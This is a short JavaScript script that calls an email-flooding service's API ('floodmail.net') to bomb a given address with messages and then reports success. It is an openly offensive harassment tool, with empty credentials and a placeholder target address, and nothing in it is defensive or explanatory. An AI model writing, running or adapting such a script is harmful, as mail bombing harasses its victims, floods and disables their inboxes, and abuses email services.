const axios = require('axios');

let floodMailKey = "";
let floodMailUser = "";

async function sendFlood(email){
	
	let { status } = await axios.post('https://floodmail.net/api', {
		username: floodMailUser,
		type: 'email',
		api_key: floodMailKey,
		email: email,
		delay: '2500'
	}, {
		headers: {
			'Content-Type': 'application/json'
		}
	});
	if(status === 200) return console.log(`[*] Flood successfully sent to ${email}...`);
}
let email = "testEmail@gmail.com";
sendFlood(email);